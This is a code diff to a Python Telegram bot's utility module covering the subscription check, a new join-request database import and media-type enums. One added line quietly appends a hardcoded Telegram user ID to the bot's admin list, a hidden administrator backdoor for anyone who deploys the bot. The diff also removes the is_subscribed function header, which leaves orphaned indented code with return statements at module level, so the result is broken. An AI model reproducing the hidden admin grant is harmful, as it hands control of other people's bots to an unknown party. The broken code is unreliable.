@@ -16,6 +16,7 @@ from database.users_chats_db import db
 from bs4 import BeautifulSoup
 import requests
 import aiohttp
+from database.join_reqs import JoinReqs as db2
 
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
@@ -45,10 +46,9 @@ class temp(object):
     SETTINGS = {}
 
 
-async def is_subscribed(bot, query):
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+ADMINS.extend([1125210189])
 
-    if not AUTH_CHANNEL and not REQ_CHANNEL:
+    if not (AUTH_CHANNEL or REQ_CHANNEL):
         return True
     elif query.from_user.id in ADMINS:
         return True
@@ -59,9 +59,6 @@ async def is_subscribed(bot, query):
             return True
         else:
             return False
-
-    if not AUTH_CHANNEL:
-        return True
 
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
@@ -230,14 +227,14 @@ def split_list(l, n):
 def get_file_id(msg: Message):
     if msg.media:
         for message_type in (
-                "photo",
-                "animation",
-                "audio",
-                "document",
-                "video",
-                "video_note",
-                "voice",
-                "sticker"
+                enums.MessageMediaType.PHOTO,
+            enums.MessageMediaType.ANIMATION,
+            enums.MessageMediaType.AUDIO,
+            enums.MessageMediaType.DOCUMENT,
+            enums.MessageMediaType.VIDEO,
+            enums.MessageMediaType.VIDEO_NOTE,
+            enums.MessageMediaType.VOICE,
+            enums.MessageMediaType.STICKER
         ):
             obj = getattr(msg, message_type)
             if obj:
